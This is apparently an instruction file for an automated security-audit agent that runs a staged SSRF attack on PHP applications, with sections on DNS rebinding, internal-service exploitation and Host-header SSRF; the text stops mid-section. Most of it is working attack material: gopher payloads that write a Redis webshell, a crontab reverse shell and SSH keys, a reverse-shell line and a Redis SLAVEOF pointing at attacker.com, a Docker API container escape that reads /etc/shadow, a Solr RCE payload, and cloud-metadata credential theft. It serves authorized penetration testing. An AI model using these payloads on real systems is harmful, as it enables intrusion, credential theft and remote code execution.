> **Skill ID**: S-045-B | **Phase**: 4 | **Stage**: 2 (Attack)
> **Input**: attack_plans/{sink_id}_plan.json, Docker container access
> **Output**: exploits/{sink_id}.json, PoC脚本/{sink_id}_poc.py


## Identity

| Field | Value |
|-------|-------|
| Skill ID | S-045-B |
| Phase | Phase-4 (Attack) |
| Responsibility | Execute progressive multi-round attack against Server-Side Request Forgery sinks |

## Input Contract

| File | Source | Required | Fields Used |
|------|--------|----------|-------------|
| Attack plan | `$WORK_DIR/attack_plans/{sink_id}_plan.json` | ✅ | `vectors`, `filter_analysis`, `bypass_strategies` |
| Credentials | `$WORK_DIR/credentials.json` | ✅ | `cookies`, `tokens`, `api_keys` |
| Container | Docker `php` container | ✅ | `exec` access |

## 🚨 CRITICAL Rules

| # | Rule | Consequence |
|---|------|-------------|
| CR-1 | Every `confirmed` verdict MUST have physical HTTP evidence: request URL + method + payload + response status + observable outcome | FAIL — evidence fabrication, finding rejected by QC |
| CR-2 | MUST NOT exceed 12 attack rounds — if stuck after round 10, execute Smart Pivot or Smart Skip | FAIL — resource exhaustion, blocks other auditors |
| CR-3 | MUST NOT attack routes not assigned in the task package — stay within allocated sink scope | FAIL — scope violation, duplicate work with other auditors |
| CR-4 | MUST read `$WORK_DIR/attack_plans/{sink_id}_plan.json` from Stage-1 before starting — do NOT re-analyze from scratch | FAIL — ignores Stage-1 analysis, wastes rounds on already-assessed vectors |
| CR-5 | MUST write exploit result to `$WORK_DIR/exploits/{sink_id}.json` conforming to `schemas/exploit_result.schema.json` | FAIL — downstream QC and report generation cannot process non-conformant output |
| CR-6 | MUST use OOB callback (DNS/HTTP to listener) or internal-only content in response to confirm SSRF — redirect following alone is insufficient | FAIL — false positive on client-side redirects |
| CR-PAYLOAD | MUST test payloads in priority order (1→2→3→4) within each round — MUST NOT skip Priority 1 to try creative payloads directly | FAIL — uncontrolled payload selection, wastes rounds on low-probability attacks |

## 8 Rounds of Attack
**Payload Selection Rule (CR-PAYLOAD)**:

Within each round, test payloads in the following priority order:

| Priority | Condition | Action |
|----------|-----------|--------|
| 1 (try first) | Simplest/most direct payload for this technique | Test baseline vulnerability existence |
| 2 | Encoding/evasion variant of Priority 1 | Test if filters block Priority 1 |
| 3 | Framework-specific or context-adaptive payload | Test framework-aware bypasses |
| 4 (try last) | Complex/chained payload | Test advanced exploitation |

- MUST test Priority 1 before trying Priority 2-4
- If Priority 1 succeeds → record evidence and proceed to next round (do NOT test remaining payloads)
- If Priority 1 fails → try Priority 2, then 3, then 4
- If ALL priorities fail → fill Round Fill-in with `failure_reason` and proceed to next round
- MUST NOT skip Priority 1 to try "creative" payloads directly


#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| selected_priority | `{1 / 2 / 3 / 4}` |
| payload | `{payload from this round's strategy — must match selected_priority}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |
| result | `{success / fail}` |
| failure_reason | `{if fail: waf_blocked / filter_effective / auth_required / timeout / not_applicable}` |

### R1 - Basic Internal Service Probing

Goal: Access internal services not exposed externally.

Payload:
- `http://ssrf-target:80/`
- `http://ssrf-target:8080/`
- `http://127.0.0.1:80/`
- `http://localhost:22/` (SSH banner grabbing)
- `http://192.168.1.1/` (gateway probing)

Inject into all parameters passed to target functions. Send requests testing both GET and POST parameters. Scan common internal ports: 80, 443, 8080, 8443, 3306, 6379, 5432, 11211, 27017.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |
| selected_priority | `{1 / 2 / 3 / 4}` |
| result | `{success / fail}` |
| failure_reason | `{if fail: waf_blocked / filter_effective / auth_required / timeout / not_applicable}` |

### R2 - IP Encoding Bypass

Goal: Bypass IP blacklists using alternative representations.

Payloads for 127.0.0.1:
- Decimal: `http://2130706433/`
- Hexadecimal: `http://0x7f000001/`
- Octal: `http://0177.0.0.1/`
- IPv6: `http://[::1]/`, `http://[0:0:0:0:0:ffff:127.0.0.1]/`
- Mixed: `http://127.1/`, `http://127.0.1/`
- Zero-prefixed: `http://0127.0.0.1/`

Resolve ssrf-target's IP and apply the same encoding variants. Test each form one by one against URL validation filters.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |
| selected_priority | `{1 / 2 / 3 / 4}` |
| result | `{success / fail}` |
| failure_reason | `{if fail: waf_blocked / filter_effective / auth_required / timeout / not_applicable}` |

### R3 - Cloud Metadata Access

Goal: Obtain cloud provider metadata containing credentials.

Payload:
- AWS: `http://169.254.169.254/latest/meta-data/`, `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- GCP: `http://metadata.google.internal/computeMetadata/v1/` (requires `Metadata-Flavor: Google` header)
- Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01` (requires `Metadata: true` header)
- DigitalOcean: `http://169.254.169.254/metadata/v1/`

When direct access is blocked, apply R2's IP encoding to 169.254.169.254. Analyze whether IMDSv2 (AWS) requires a prior PUT to obtain a token.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |
| selected_priority | `{1 / 2 / 3 / 4}` |
| result | `{success / fail}` |
| failure_reason | `{if fail: waf_blocked / filter_effective / auth_required / timeout / not_applicable}` |

### R4 - Protocol Switching

Goal: Interact with internal services using non-HTTP protocols.

Payload:
- `gopher://ssrf-target:6379/_*1%0d%0a$8%0d%0aFLUSHALL%0d%0a` (Redis)
- `gopher://ssrf-target:25/_HELO%20evil%0d%0a` (SMTP)
- `dict://ssrf-target:6379/INFO` (Redis info via dict)
- `file:///etc/passwd` (local file read)
- `ftp://ssrf-target/` (FTP enumeration)
- `ldap://ssrf-target/` (LDAP query)

Gopher is the most powerful protocol in SSRF, capable of sending arbitrary bytes. Construct specific payloads according to the target service protocol (Redis, Memcached, SMTP, FastCGI).

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |
| selected_priority | `{1 / 2 / 3 / 4}` |
| result | `{success / fail}` |
| failure_reason | `{if fail: waf_blocked / filter_effective / auth_required / timeout / not_applicable}` |

### R5 - DNS Rebinding

Goal: Bypass hostname validation through DNS rebinding.

Steps:
1. Register a domain that alternates responses between an allowed IP and the internal target IP
2. Set TTL to 0 or extremely short (1 second)
3. The first DNS resolution passes validation (resolves to the allowed IP)
4. The second resolution (actual request) resolves to the internal target

Use services such as rebind.network or set up a custom DNS server.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |
| selected_priority | `{1 / 2 / 3 / 4}` |
| result | `{success / fail}` |
| failure_reason | `{if fail: waf_blocked / filter_effective / auth_required / timeout / not_applicable}` |

### R6 - 302 Redirect Bypass

Goal: Use external redirects to reach internal targets.

Steps:
1. Set up a redirect service that responds with `302 Location: http://ssrf-target:80/`
2. Submit the external URL to the application
3. If the application follows the redirect, it reaches the internal service

Variants:
- HTTP 301/302/307/308 redirects
- Meta refresh redirect: `<meta http-equiv="refresh" content="0;url=http://ssrf-target/">`
- JavaScript redirect (if rendered)
- Redirect chain: external -> external -> internal

Send redirect requests to test whether the application only validates the initial URL or also validates the redirect target.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |
| selected_priority | `{1 / 2 / 3 / 4}` |
| result | `{success / fail}` |
| failure_reason | `{if fail: waf_blocked / filter_effective / auth_required / timeout / not_applicable}` |

### R7 - URL Parsing Differential Exploitation

Goal: Exploit differences between URL validation and URL request parsers.

Payload:
- `http://allowed-host@ssrf-target/` (userinfo parsing differential)
- `http://ssrf-target\@allowed-host/` (backslash confusion)
- `http://allowed-host#@ssrf-target/` (fragment truncation)
- `http://ssrf-target:80?@allowed-host/` (query confusion)
- `http://allowed-host%00@ssrf-target/` (null byte)
- `http://ssrf-target/\..\allowed-host` (path traversal in URL)

Exploit differences between `parse_url()`, `filter_var()`, and cURL's actual URL handling. Send each variant one by one and compare what the validator sees versus what the HTTP client actually requests.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |
| selected_priority | `{1 / 2 / 3 / 4}` |
| result | `{success / fail}` |
| failure_reason | `{if fail: waf_blocked / filter_effective / auth_required / timeout / not_applicable}` |

### R8 - SSRF → Redis RCE Chain

Goal: Chain SSRF into Remote Code Execution via internal Redis.

Steps:
1. Confirm Redis is reachable on the internal network via R1/R4 reconnaissance results
2. Construct gopher payload for Redis CONFIG SET:
   ```
   gopher://ssrf-target:6379/_*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a
   ```
3. Write a webshell via Redis:
   ```
   SET shell "<?php system($_GET['cmd']); ?>"
   CONFIG SET dbfilename shell_proof.php
   BGSAVE
   ```
4. Access the webshell via HTTP

Alternative chains:
- SSRF -> FastCGI (port 9000) -> PHP code execution
- SSRF -> Memcached -> Deserialization injection
- SSRF -> Internal API -> Privilege escalation

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |
| selected_priority | `{1 / 2 / 3 / 4}` |
| result | `{success / fail}` |
| failure_reason | `{if fail: waf_blocked / filter_effective / auth_required / timeout / not_applicable}` |

### R9 - Cloud Service Specific Exploitation (Enhanced)

#### AWS Advanced
- IMDSv2 bypass: If PUT is reachable, first obtain a token then request metadata
- ECS container credentials: `http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`
- Lambda environment variables: `http://localhost:9001/2018-06-01/runtime/invocation/next`

#### GCP Advanced
- Service Account Token: `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`
- Kubernetes Service Account: `http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env`

#### Azure Advanced
- Managed Identity Token: `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/`

#### Kubernetes
- Service Account Token: `https://kubernetes.default.svc/api/v1/namespaces/default/secrets`
- Requires Header: `Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)`

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |
| selected_priority | `{1 / 2 / 3 / 4}` |
| result | `{success / fail}` |
| failure_reason | `{if fail: waf_blocked / filter_effective / auth_required / timeout / not_applicable}` |

### R10 - SSRF → FastCGI RCE

Direct attack on the PHP-FPM FastCGI interface:

1. Construct FastCGI payload:
   ```
   gopher://127.0.0.1:9000/_<FastCGI_binary_payload>
   ```
2. Set `PHP_VALUE` and `PHP_ADMIN_VALUE`:
   ```
   auto_prepend_file = php://input
   allow_url_include = On
   ```
3. POST body contains PHP code
4. Tool: `Gopherus` auto-generates FastCGI gopher payload

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |
| selected_priority | `{1 / 2 / 3 / 4}` |
| result | `{success / fail}` |
| failure_reason | `{if fail: waf_blocked / filter_effective / auth_required / timeout / not_applicable}` |

### R11 - SSRF → Internal API Enumeration

Systematically probe internal microservices:

- Common internal service ports: 8080(Tomcat), 8000(Django), 3000(Node), 5000(Flask), 9200(Elasticsearch), 15672(RabbitMQ), 8500(Consul), 2379(etcd)
- Docker API: `http://172.17.0.1:2375/containers/json` → Container escape
- Kubernetes API: `https://10.0.0.1:443/api/v1/`
- Consul: `http://consul:8500/v1/agent/self` → Configuration and tokens
- etcd: `http://etcd:2379/v2/keys/?recursive=true` → All configuration
- Elasticsearch: `http://es:9200/_cat/indices` → Data indices

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |
| selected_priority | `{1 / 2 / 3 / 4}` |
| result | `{success / fail}` |
| failure_reason | `{if fail: waf_blocked / filter_effective / auth_required / timeout / not_applicable}` |

### R12 - Blind SSRF Advanced Techniques

When direct response observation is not possible:

- **Time differential**: Internal service response time vs non-existent port timeout duration
- **OOB HTTP callback**: Have the internal service call back to `http://oob-listener:9001/ssrf-proof-{SINK_ID}`, then check `$WORK_DIR/oob/log.jsonl` for the corresponding request
- **DNS callback**: If OOB listener is unavailable, fall back to `http://unique-id.burpcollaborator.net/`
- **Status code differential**: 200 vs 500 vs timeout
- **Response length differential**: Different internal services return different lengths
- **Cache probing**: Infer internal request results using cache behavior

> **OOB Verification Quick Command:**
> ```bash
> # Send SSRF payload targeting OOB listener
> curl -sS "http://target/api?url=http://oob-listener:9001/ssrf-${SINK_ID}-R${ROUND}"
> # Wait 2 seconds then check callback log
> sleep 2 && grep "ssrf-${SINK_ID}-R${ROUND}" "$WORK_DIR/oob/log.jsonl"
> ```

## Workflow

1. Identify all parameters controlling outbound requests through code review or proxy analysis
2. Execute R1 through R8, progressively escalating technical complexity upon failure
3. In each round, send payloads one by one testing all identified injection points and parameter vectors
4. Use out-of-band detection (DNS callback, HTTP callback) when Blind SSRF is suspected
5. Record every request, response, and timing observation
6. Upon response confirmation, record the complete payload and response excerpt
7. After all rounds are complete, generate a priority-sorted report

## Detection (Vulnerability Pattern Recognition)

The following code patterns indicate potential SSRF vulnerabilities:
- Pattern 1: `file_get_contents($_GET['url'])` / `curl_setopt($ch, CURLOPT_URL, $userInput)` — User input directly used as URL to initiate server-side request
- Pattern 2: `$ip = gethostbyname($host); if(!isInternal($ip)) { curl_exec($url); }` — DNS resolution separated from actual request, creating DNS Rebinding TOCTOU risk
- Pattern 3: `$apiUrl = "http://" . $_SERVER['HTTP_HOST'] . "/api/internal"` — Host Header concatenated into internal request URL
- Pattern 4: `new SoapClient($wsdlUrl)` / `getimagesize($url)` — Non-explicit HTTP clients that still initiate server-side requests
- Pattern 5: `filter_var($url, FILTER_VALIDATE_URL)` followed by direct request — `filter_var` does not check whether the IP is an internal address

## Key Insight

> **Key point**: The real danger of SSRF is not "being able to access the internal network," but that internal services generally lack authentication (Docker API/Redis/Memcached/Elasticsearch are unauthenticated by default). During auditing, you MUST focus on both explicit HTTP clients (curl/file_get_contents) and implicit request initiators (SoapClient/getimagesize/Host Header concatenation), as well as the TOCTOU time window between DNS resolution and the actual request.

### Smart Pivot (Stuck Detection)

When 3 consecutive rounds fail (current round ≥ 4), trigger Smart Pivot:

1. Re-reconnaissance: Re-read target code to find missed filter logic and alternative entry points
2. Cross-intelligence: Consult the shared findings database (`$WORK_DIR/audit_session.db`) for related findings from other experts
3. Decision tree matching: Select a new attack direction based on failure patterns in `shared/pivot_strategy.md`
4. If no new path is found, terminate early to avoid wasting rounds producing hallucinated results

## Prerequisites and Scoring (MUST be filled)

The output `exploits/{sink_id}.json` MUST contain the following two objects:

### prerequisite_conditions
```json
{
  "auth_requirement": "anonymous|authenticated|admin|internal_network",
  "bypass_method": "Authentication bypass method, null if none",
  "other_preconditions": ["Precondition 1", "Precondition 2"],
  "exploitability_judgment": "directly_exploitable|conditionally_exploitable|not_exploitable"
}
```
- `auth_requirement` MUST match the auth_level for this route in auth_matrix.json
- `exploitability_judgment = "not_exploitable"` → final_verdict SHALL be at most potential
- `other_preconditions` lists all non-authentication prerequisites (e.g., PHP configuration, Composer dependencies, environment variables)

### severity (3-dimensional scoring, see shared/severity_rating.md for details)
```json
{
  "reachability": 0-3, "reachability_reason": "...",
  "impact": 0-3, "impact_reason": "...",
  "complexity": 0-3, "complexity_reason": "...",
  "score": "R×0.40+I×0.35+C×0.25",
  "cvss": "(score/3.0)×10.0",
  "level": "C|H|M|L",
  "vuln_id": "C-SSRF-001"
}
```
- All reason fields MUST contain specific justification and MUST NOT be empty
- score and evidence_score MUST be consistent (≥2.10→≥7, 1.20-2.09→4-6, <1.20→1-3)

### Evidence Contract Reference (EVID)

Every vulnerability conclusion MUST reference the following evidence points in the `evidence` field (refer to `shared/evidence_contract.md`):
- `EVID_SSRF_URL_NORMALIZATION` — URL normalization handling ✅Required
- `EVID_SSRF_FINAL_URL` — Final request URL ✅Required
- `EVID_SSRF_DNS_INNER_BLOCK` — DNS/internal network blocking status ✅Required
- `EVID_SSRF_REDIRECT_CHAIN` — Redirect chain (conditionally required)
- `EVID_SSRF_EXECUTION_RESPONSE` — Attack response evidence (required when confirmed)

Missing required EVID → conclusion is automatically downgraded (confirmed→suspected→unverified).

### Attack Memory Write

After the attack cycle ends, write experience to the attack memory store (format per `shared/attack_memory.md` write protocol):

- ✅ confirmed: Record successful payload type + bypass technique + successful round
- ❌ failed (≥3 rounds): Record all excluded strategies + failure reasons
- ⚠️ partial: Record partially successful strategies + blocking reasons
- ❌ failed (<3 rounds): Do not record

Use `bash tools/audit_db.sh memory-write '<json>'` to write. SQLite WAL mode automatically ensures concurrency safety.

## Output

After all rounds are complete, write the final result to `$WORK_DIR/exploits/{sink_id}.json`.

> **Strictly follow the fill-in template in `shared/OUTPUT_TEMPLATE.md` to generate the output file.**
> JSON structure follows `schemas/exploit_result.schema.json`; field constraints are in `shared/data_contracts.md` Section 9.
> Execute the 3 check commands at the bottom of OUTPUT_TEMPLATE.md before submission.

## Real-time Sharing and Second-Order Tracking

### Shared Write
When internal services/endpoints are discovered, you **MUST** write to the shared findings database (`$WORK_DIR/audit_session.db`):
- Reachable internal services → `finding_type: internal_url`
- Credentials obtained from cloud metadata → `finding_type: credential`

### Shared Read
Read the shared findings database before starting the attack phase to leverage internal IPs discovered through information disclosure.

### Second-Order Tracking
Record URLs written to DB at `$WORK_DIR/second_order/store_points.jsonl`.
Record locations where URLs are retrieved from DB and used for HTTP requests at `$WORK_DIR/second_order/use_points.jsonl`.

## Constraints

- MUST NOT export real credentials from cloud metadata in production environments
- Use read-only probes before attempting write operations (e.g., Redis SET)
- Comply with authorization scope; only test authorized internal services
- Record all attempts to ensure audit trail integrity

## DNS Rebinding Attack

DNS Rebinding is an advanced technique that exploits DNS resolution timing differences (TOCTOU) to bypass SSRF protections. Its core principle is: the application performs DNS resolution separately during the validation phase and the actual request phase, while the attacker-controlled DNS server returns different IP addresses for each resolution.

### Attack Principle — TOCTOU (Time of Check vs Time of Use)

Typical SSRF protection flow:
1. Application receives a user-submitted URL (e.g., `http://attacker.com/api`)
2. **Check phase**: `gethostbyname("attacker.com")` → resolves to `8.8.8.8` (legitimate external IP) → passes validation
3. **Use phase**: `curl_exec()` re-resolves `attacker.com` → DNS now returns `127.0.0.1` → request goes to internal network

Key conditions:
- Attacker's DNS server sets TTL to 0, ensuring every query triggers a fresh resolution
- First resolution returns a legitimate IP (passes validation), second resolution returns the target internal IP

### Rebinder Tool Usage

**Using the rbndr.us online service:**
```
# Format: <hex_ip1>.<hex_ip2>.rbndr.us
# Alternates between 1.2.3.4 (legitimate IP) and 127.0.0.1
http://01020304.7f000001.rbndr.us/

# Alternates between 8.8.8.8 and 169.254.169.254 (AWS metadata)
http://08080808.a9fea9fe.rbndr.us/latest/meta-data/
```

**Using rebind.network:**
```
# Visit http://rebind.network to configure two IPs
# A record 1: Legitimate external IP (e.g., 93.184.216.34)
# A record 2: Target internal IP (e.g., 127.0.0.1)
# TTL: 0
```

**Self-hosted DNS Rebinding server (Python concept):**
```python
# Simplified logic: maintain a toggle state
# First query -> return legitimate IP
# Second query -> return 127.0.0.1
# Track query count per domain via a global counter or Redis
```

### Code Audit — Detecting DNS Rebinding Vulnerable Code

**Pattern 1: Separated validation and request (high risk)**
```php
// VULNERABLE: DNS resolution occurs twice
$ip = gethostbyname(parse_url($url, PHP_URL_HOST));  // Check
if (!isInternalIP($ip)) {
    $response = file_get_contents($url);  // Use - re-resolves DNS
}
```

**Pattern 2: Correct defense — resolve once, connect by IP**
```php
// SAFE: Resolve only once, make request using IP
$host = parse_url($url, PHP_URL_HOST);
$ip = gethostbyname($host);
if (!isInternalIP($ip)) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://{$ip}/path");
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Host: {$host}"]);
    curl_exec($ch);
}
```

**Detection rules — grep commands:**
```bash
# Find pattern where gethostbyname is followed by curl_exec/file_get_contents
grep -Pn 'gethostbyname|dns_get_record' *.php
grep -Pn 'filter_var.*FILTER_VALIDATE_URL' *.php

# Find files with separated validation and request
# Same file contains both validation functions and HTTP request functions
grep -l 'gethostbyname\|inet_pton\|ip2long' *.php | \
  xargs grep -l 'curl_exec\|file_get_contents\|fopen'
```

### Key Insight

> The essence of DNS Rebinding is a TOCTOU race condition. Any code that separates "DNS resolution for validation" and "DNS resolution for the request" into two steps is at risk. The correct defense is: resolve once, connect by IP. During auditing, focus on whether the return value of `gethostbyname()` is directly used for the subsequent socket connection, rather than only used for blacklist checking while still making the request to the original hostname.

---

## SSRF → Internal Service Exploitation

Once the SSRF vulnerability is confirmed through response, the next step is to identify and exploit unauthenticated services running on the internal network. Below are the most common high-value targets and their complete attack chains.

### 1. Docker API (Port 2375/2376) → Command Execution / Container Escape

Docker Remote API defaults to listening on `tcp://0.0.0.0:2375` (no TLS) with no authentication required.

**Attack flow:**
1. Probe whether the Docker API is reachable
2. Create a malicious container mounting the host filesystem
3. Execute commands in the container, equivalent to host root privileges

**Payload examples:**
```
# Step 1: Confirm Docker API is alive
GET http://172.17.0.1:2375/version
GET http://172.17.0.1:2375/containers/json

# Step 2: Create a container mounting the host root directory
POST http://172.17.0.1:2375/containers/create
Content-Type: application/json

{
  "Image": "alpine",
  "Cmd": ["/bin/sh", "-c", "cat /mnt/host/etc/shadow"],
  "Binds": ["/:/mnt/host"],
  "Privileged": true
}

# Step 3: Start the container
POST http://172.17.0.1:2375/containers/{id}/start

# Step 4: Use exec to execute arbitrary commands
POST http://172.17.0.1:2375/containers/{id}/exec
{
  "AttachStdout": true,
  "Cmd": ["cat", "/mnt/host/etc/shadow"]
}
```

**Sending via Gopher protocol (SSRF scenario):**
```
gopher://172.17.0.1:2375/_POST%20/containers/create%20HTTP/1.1%0d%0aHost:%20172.17.0.1%0d%0aContent-Type:%20application/json%0d%0aContent-Length:%20...%0d%0a%0d%0a{"Image":"alpine","Cmd":[...],"Binds":["/:mnt"]}
```

**Detection pattern:**
```bash
# Hardcoded Docker socket/API addresses in code
grep -rn 'docker\.sock\|:2375\|:2376\|DOCKER_HOST' .
# Check for access control on Docker API
grep -rn 'docker.*api\|container.*create' .
```

### 2. Redis (Port 6379) → Webshell / Crontab / SSH Key Write

Redis has no authentication by default and supports persisting data as arbitrary files, making it the most classic target in SSRF exploitation.

**Attack flow A — Write webshell:**
```
# Send Redis commands via gopher protocol
gopher://ssrf-target:6379/_*1%0d%0a$8%0d%0aFLUSHALL%0d%0a*3%0d%0a$3%0d%0aSET%0d%0a$1%0d%0ax%0d%0a$25%0d%0a<?php system($_GET[1]);?>%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0aSAVE%0d%0a
```

**Attack flow B — Write crontab reverse shell:**
```redis
FLUSHALL
SET x "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1\n\n"
CONFIG SET dir /var/spool/cron/crontabs/
CONFIG SET dbfilename root
SAVE
```

**Attack flow C — Write SSH public key:**
```redis
FLUSHALL
SET x "\n\nssh-rsa AAAAB3...attacker@host\n\n"
CONFIG SET dir /root/.ssh/
CONFIG SET dbfilename authorized_keys
SAVE
```

**Attack flow D — SLAVEOF data exfiltration:**
```redis
# Set target Redis as a slave of attacker's Redis
SLAVEOF attacker.com 6379
# Attacker's Redis can sync malicious data to target
# Or load a malicious .so via MODULE LOAD for RCE
```

**Detection pattern:**
```bash
# Find Redis connections without password configuration in code
grep -rn 'redis.*connect\|REDIS_HOST\|6379' .
grep -rn 'Redis.*auth\|requirepass' .
# Audit whether Redis port has network isolation
```

### 3. Internal Admin Panels (Memcached / Elasticsearch / Solr)

#### Memcached (Port 11211) — Unauthenticated cache service

**Attack flow:**
```
# Read all cache keys (may contain sessions, tokens)
# Send Memcached text protocol via gopher
gopher://ssrf-target:11211/_stats%20items%0d%0a

# Read keys from a specific slab
gopher://ssrf-target:11211/_stats%20cachedump%201%20100%0d%0a

# Read session data (may contain admin token)
gopher://ssrf-target:11211/_get%20session:admin_user_id%0d%0a

# Inject malicious session (if session key format is known)
gopher://ssrf-target:11211/_set%20session:evil%200%203600%2050%0d%0a{"user_id":1,"role":"admin","username":"admin"}%0d%0a
```

#### Elasticsearch (Port 9200) — Unauthenticated search engine

**Attack flow:**
```
# Get cluster information
GET http://ssrf-target:9200/

# List all indices (may include users, orders, logs)
GET http://ssrf-target:9200/_cat/indices?v

# Search for sensitive data
GET http://ssrf-target:9200/users/_search?q=role:admin
GET http://ssrf-target:9200/_all/_search?q=password

# Execute commands via Groovy script (old versions ES < 1.4.3)
POST http://ssrf-target:9200/_search
{"script_fields":{"exec":{"script":"Runtime.getRuntime().exec('id')"}}}
```

#### Apache Solr (Port 8983) — Unauthenticated search platform

**Attack flow:**
```
# Get Solr info and core list
GET http://ssrf-target:8983/solr/admin/cores?action=STATUS

# Read configuration files (may contain database credentials)
GET http://ssrf-target:8983/solr/admin/file?file=solrconfig.xml

# Velocity template RCE (CVE-2019-17558, Solr < 8.3.1)
# Step 1: Enable VelocityResponseWriter
POST http://ssrf-target:8983/solr/{core}/config
{"update-queryresponsewriter":{"startup":"lazy","name":"velocity","class":"solr.VelocityResponseWriter","template.base.dir":"","solr.resource.loader.enabled":"true","params.resource.loader.enabled":"true"}}

# Step 2: Execute command
GET http://ssrf-target:8983/solr/{core}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))
```

**Detection pattern (general):**
```bash
# Find code connecting to internal services
grep -rn '11211\|memcache\|Memcached' .
grep -rn '9200\|elasticsearch\|elastic' .
grep -rn '8983\|solr' .
# Confirm whether authentication is configured
grep -rn 'auth\|password\|token\|apikey' . | grep -i 'elastic\|solr\|memcache'
```

### Key Insight

> The real danger of SSRF is not "being able to access the internal network," but that internal services generally lack authentication. Docker API, Redis, Memcached, and Elasticsearch all default to unauthenticated configurations. During auditing, you MUST build an internal service inventory (port scan via SSRF) and assess each reachable service's default authentication status and known exploitation chains. Priority order: Docker API (direct RCE) > Redis (file write → RCE) > Elasticsearch/Solr (data leak + potential RCE) > Memcached (session hijacking).

---

## Host Header SSRF

Host Header SSRF is an often-overlooked SSRF variant: the application concatenates the HTTP Host header value into an internal request URL, allowing attackers to redirect internal requests to arbitrary targets by modifying the Host header.

### Vulnerability Principle

In PHP, the value of `$_SERVER['HTTP_HOST']` is entirely controlled by the client. When developers use it to construct internal API call URLs, SSRF is introduced.

**Typical vulnerable code:**
```php
// VULNERABLE: Host header directly concatenated into internal request URL
$apiUrl = "http://" . $_SERVER['HTTP_HOST'] . "/api/internal/getUserInfo";
$response = file_get_contents($apiUrl);

// VULNERABLE: Using Symfony/Laravel getHost()
$apiUrl = "http://" . $request->getHost() . ":8080/internal/check";
$result = $httpClient->get($apiUrl);

// VULNERABLE: Used to generate callback URL
$callbackUrl = "http://" . $_SERVER['HTTP_HOST'] . "/webhook/callback";
$this->notifyService->register($callbackUrl);  // Internal service will call back to this URL
```

### Code Audit Detection Methods

**Search for `HTTP_HOST` used in URL construction:**
```bash
# Find HTTP_HOST used in string concatenation (non-output scenarios)
grep -rn '$_SERVER\[.HTTP_HOST.\]' . | grep -v 'echo\|print\|header('
grep -rn 'HTTP_HOST' . | grep -i 'url\|api\|endpoint\|request\|fetch\|curl'

# Find getHost() used in URL construction
